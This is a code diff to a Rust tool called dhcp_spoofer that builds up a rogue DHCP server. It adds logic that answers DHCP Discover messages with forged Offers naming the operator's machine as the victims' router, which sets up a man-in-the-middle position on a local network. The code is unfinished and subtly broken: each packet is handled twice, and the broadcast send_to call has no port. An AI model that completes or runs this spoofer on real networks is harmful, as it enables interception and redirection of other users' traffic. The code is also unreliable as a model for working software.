@@ -6,15 +6,18 @@ use std::net::{Ipv4Addr, UdpSocket};
 use dhcp_spoofer::SpooferError;
 pub struct Spoofer {
     assign : Ipv4Addr,
+    server_address : Ipv4Addr,
     lease_duration: u32,
     subnet_mask: Ipv4Addr,
+
 }
 
 impl Spoofer {
     pub fn new(cli_args: dhcp_spoofer::Args) -> Spoofer {
         Spoofer { assign: cli_args.assign,
+            server_address : cli_args.my_address,
             lease_duration: cli_args.lease_duration,
-            subnet_mask: cli_args.subnet }
+            subnet_mask: cli_args.subnet}
     }
 
     pub fn spoof(&self) -> Result<(), SpooferError>{
@@ -22,9 +25,21 @@ impl Spoofer {
         socket.set_broadcast(true)?;
 
         let mut buffer = [0; 1000];
+        
+        
 
         while let Ok((num_bytes, src_addr)) = socket.recv_from(&mut buffer) {
-           if let Err(e) = Spoofer::handle_message(Spoofer::decode_message(&buffer)?){
+            match self.handle_message(Spoofer::decode_message(&buffer)?){
+                Ok(Some(msg)) => {
+                    let mut outgoingMessage = Vec::new();
+                    let mut e = Encoder::new(&mut outgoingMessage);
+                    msg.encode(&mut e)?;
+                    socket.send_to(&outgoingMessage, "255.255.255.255")?;
+                },
+                Ok(None) => {},
+                Err(e) => return Err(e),
+            }
+           if let Err(e) = self.handle_message(Spoofer::decode_message(&buffer)?){
                return Err(e);
            }
         }
@@ -36,27 +51,29 @@ impl Spoofer {
         Message::decode(&mut Decoder::new(&msg))
     }
 
-    fn handle_message(msg : dhcp::Message) -> Result<(), SpooferError>{
+    fn handle_message(&self, msg : dhcp::Message) -> Result<Option<dhcp::Message>, SpooferError> {
         match msg.opts().msg_type() {
             Some(dhcp::MessageType::Discover) => {
-                info!("Received a DHCP Discover message!");
-                //todo: send response
-                Ok(())
+                println!("Received a DHCP Discover message!");
+                match self.make_offer(msg) {
+                    Ok(offerMessage) => Ok(Some(offerMessage)),
+                    Err(e) => Err(e)
+                }
             },
             Some(dhcp::MessageType::Request) => {
-                info!("Received a DHCP Request!");
+                println!("Received a DHCP Request!");
                 //todo: send response
-                Ok(())
+                Ok(None)
             },
             Some(dhcp::MessageType::Decline) => {
-                info!("Received a DHCP Decline!");
+                println!("Received a DHCP Decline!");
 
-                Ok(())
+                Ok(None)
             },
             Some(other_message) => {
-                info!("Received some unimplemented DHCP message");
+                println!("Received some unimplemented DHCP message");
 
-                Ok(())
+                Ok(None)
             },
             None => {
                 error!("Received message without DHCP type!");
@@ -65,6 +82,22 @@ impl Spoofer {
             }
         }
     }
+
+    fn make_offer(&self, msg : dhcp::Message) -> Result<dhcp::Message, SpooferError> {
+        let mut offer = dhcp::Message::default();
+        
+        offer.set_flags(dhcp::Flags::default().set_broadcast())
+            .set_chaddr(msg.chaddr())
+            .set_yiaddr(self.assign)
+            .set_siaddr(self.server_address)
+            .opts_mut()
+            .insert(dhcp::DhcpOption::MessageType(dhcp::MessageType::Offer));
+        offer.opts_mut().insert(dhcp::DhcpOption::SubnetMask(self.subnet_mask));
+        offer.opts_mut().insert(dhcp::DhcpOption::Router(vec![self.server_address]));
+        offer.opts_mut().insert(dhcp::DhcpOption::AddressLeaseTime(self.lease_duration));
+
+        Ok(offer)
+    }
 }
 #[test]
 fn test_decode(){
@@ -72,7 +105,7 @@ fn test_decode(){
 
     let result = Spoofer::decode_message(&discover_message_bytes().unwrap()).unwrap();
 
-    info!("result: {:?}", result);
+    println!("result: {:?}", result);
 
 }
 
